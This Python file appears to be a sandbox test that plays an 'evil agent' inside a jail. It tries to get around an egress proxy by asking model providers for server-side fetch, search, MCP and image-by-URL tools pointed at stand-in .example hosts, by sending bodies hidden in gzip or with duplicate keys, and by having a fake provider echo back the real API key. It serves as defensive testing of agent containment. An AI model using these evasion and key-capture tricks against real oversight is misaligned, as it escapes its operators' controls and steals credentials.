"""Evil agent: make the model provider reach other hosts for it, and take a key it echoes.

Runs INSIDE the jail, as the agent's user (python3 -c). Usage:
<script> <anthropic host> <openai host> <tag> <fake anthropic key> <fake openai key> <tools|echo>
Prints one JSON object on its last line.

With its own fake key (the proxy swaps in the real one on the way out), it asks the provider for
tools that run on the provider's side: Anthropic's web fetch, an MCP connector, an image given by
URL, a web search hidden in a gzip body; OpenAI's MCP tool and Chat Completions' web search. Then
bodies the gate cannot read as the provider's (not JSON, a duplicate key) and an endpoint that
is not a model call (batches). The control is a plain model call with its own tool. Last, it asks
a provider that echoes the key it gets (``T06-ECHO-*``) and keeps what reached it. The hosts are
the test's fake internet; nothing reaches a real provider.
"""

import gzip
import http.client
import json
import ssl
import sys

anthropic, openai, tag, fake_anthropic, fake_openai, mode = sys.argv[1:7]
PROXY = ("backtide-proxy", 8080)
CA = "/etc/backtide-ca/ca.pem"


def post(host, path, body, headers):
    conn = http.client.HTTPSConnection(
        *PROXY, timeout=30, context=ssl.create_default_context(cafile=CA)
    )
    conn.set_tunnel(host, 443)
    try:
        conn.request("POST", path, body=body, headers=headers)
        response = conn.getresponse()
        heads = "\n".join(f"{k}: {v}" for k, v in response.getheaders())
        data = b""
        try:
            while True:
                chunk = response.read1(65536)
                if not chunk:
                    break
                data += chunk
        except (OSError, http.client.HTTPException) as error:
            return {"status": response.status, "headers": heads, "body": data.decode("latin-1"),
                    "cut": str(error)}  # fmt: skip
        return {"status": response.status, "headers": heads, "body": data.decode("latin-1")}
    except (OSError, http.client.HTTPException) as error:
        return {"status": None, "body": "", "error": f"{type(error).__name__}: {error}"[:300]}
    finally:
        conn.close()


def to_anthropic(name, request, *, raw=None, extra=None, path="/v1/messages"):
    headers = {"content-type": "application/json", "anthropic-version": "2023-06-01",
               "x-api-key": fake_anthropic, **(extra or {})}  # fmt: skip
    body = raw if raw is not None else json.dumps(request).encode()
    return post(anthropic, f"/{tag}/{name}{path}", body, headers)


def to_openai(name, request, path):
    headers = {"content-type": "application/json", "authorization": f"Bearer {fake_openai}"}
    return post(openai, f"/{tag}/{name}{path}", json.dumps(request).encode(), headers)


def ask(text, **extra):
    return {"model": "fake-claude", "max_tokens": 64,
            "messages": [{"role": "user", "content": text}], **extra}  # fmt: skip


def provider_side_tools():
    image_by_url = {
        "type": "image",
        "source": {"type": "url", "url": f"https://{tag}.example/x.png"},
    }
    searching = ask("search", tools=[{"type": "web_search_20250305", "name": "web_search"}])
    refused = {
        "web-fetch": to_anthropic(
            "web-fetch",
            ask("fetch it", tools=[{"type": "web_fetch_20250910", "name": "web_fetch"}]),
        ),
        "mcp": to_anthropic(
            "mcp",
            ask(
                "use it",
                mcp_servers=[
                    {"type": "url", "url": f"https://{tag}.example/mcp", "name": "elsewhere"}
                ],
            ),
        ),  # fmt: skip
        "url-image": to_anthropic(
            "url-image", ask("look", messages=[{"role": "user", "content": [image_by_url]}])
        ),
        "gzip-search": to_anthropic(
            "gzip-search",
            None,
            raw=gzip.compress(json.dumps(searching).encode()),
            extra={"content-encoding": "gzip"},
        ),
        "oa-mcp": to_openai(
            "oa-mcp",
            {
                "model": "fake-gpt",
                "input": "hi",
                "tools": [
                    {"type": "mcp", "server_label": "x", "server_url": f"https://{tag}.example/"}
                ],
            },
            "/v1/responses",
        ),  # fmt: skip
        "oa-search": to_openai(
            "oa-search",
            {
                "model": "fake-gpt",
                "web_search_options": {},
                "messages": [{"role": "user", "content": "search"}],
            },
            "/v1/chat/completions",
        ),  # fmt: skip
        "not-json": to_anthropic("not-json", None, raw=b"tools=web_search_20250305"),
        "duplicate": to_anthropic(
            "duplicate",
            None,
            raw=b'{"model": "fake-claude", "max_tokens": 8, "messages": [], "tools": [], '
            b'"tools": [{"type": "web_fetch_20250910", "name": "web_fetch"}]}',
        ),
        "made-up-option": to_anthropic(
            "made-up-option", ask("hi", made_up_option={"enabled": True})
        ),
        "other-case": to_anthropic(
            "other-case",
            None,
            raw=json.dumps(
                {**ask("hi"), "Tools": [{"type": "web_fetch_20250910", "name": "web_fetch"}]}
            ).encode(),
        ),
        "batch": to_anthropic(
            "batch",
            {"requests": [{"custom_id": "1", "params": searching}]},
            path="/v1/messages/batches",
        ),
    }
    plain = to_anthropic(
        "plain", ask("hi", tools=[{"name": "exec", "input_schema": {"type": "object"}}])
    )

    return {"refused": {name: r["status"] for name, r in refused.items()}, "plain": plain["status"]}


def joined_text(body):
    """The text a client would rebuild from the SSE deltas it got."""
    text = ""
    for line in body.splitlines():
        if not line.startswith("data: "):
            continue
        try:
            data = json.loads(line[6:])
        except ValueError:
            continue
        if not isinstance(data, dict):
            continue
        text += str((data.get("delta") or {}).get("text") or "")
        for choice in data.get("choices") or []:
            text += str((choice.get("delta") or {}).get("content") or "")
    return text


def echoed_keys():
    echoes = {
        "echo-json": to_anthropic("echo-json", ask("T06-ECHO-JSON")),
        "echo-header": to_anthropic("echo-header", ask("T06-ECHO-HEADER")),
        "echo-sse": to_anthropic("echo-sse", ask("T06-ECHO-SSE", stream=True)),
        "echo-b64": to_openai(
            "echo-b64",
            {
                "model": "fake-gpt",
                "stream": True,
                "messages": [{"role": "user", "content": "T06-ECHO-B64"}],
            },
            "/v1/chat/completions",
        ),  # fmt: skip
    }
    return {
        name: {"status": r["status"], "body": r["body"][:8000], "headers": r.get("headers", ""),
               "text": joined_text(r["body"])[:8000], "cut": r.get("cut")}
        for name, r in echoes.items()
    }  # fmt: skip


print(json.dumps(provider_side_tools() if mode == "tools" else {"echoes": echoed_keys()}))
